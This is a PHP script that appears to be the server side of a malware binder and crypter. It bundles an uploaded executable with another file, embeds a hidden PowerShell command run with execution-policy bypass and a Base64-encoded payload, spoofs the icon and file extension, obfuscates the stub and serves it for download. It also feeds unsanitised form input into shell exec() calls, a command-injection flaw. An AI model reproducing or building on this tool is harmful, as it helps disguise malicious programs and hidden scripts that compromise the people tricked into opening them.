<?php
  // Get form data
  $exe_file = $_FILES['exe-file']['tmp_name'];
  $icon_file = $_FILES['icon-file']['tmp_name'];
  $extension = $_POST['extension'];
  $ps_script = $_POST['ps-script'];
  $binder_file = $_FILES['binder-file']['tmp_name'];

  // Generate random file name
  $stub_name = uniqid('', true) . '.exe';

  // Build PowerShell command
  $ps_command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand ";
  $ps_command .= base64_encode($ps_script);

  // Generate stub file
  exec("binder.exe $exe_file $binder_file $stub_name");
  exec("icon.exe $stub_name $icon_file");
  exec("extension.exe $stub_name $extension");
  exec("obfuscate.exe $stub_name $ps_command");

  // Download stub file
  header('Content-Type: application/octet-stream');
  header('Content-Disposition: attachment; filename="' . $stub_name . '"');
  readfile($stub_name);

  // Delete stub file
  unlink($stub_name);
?>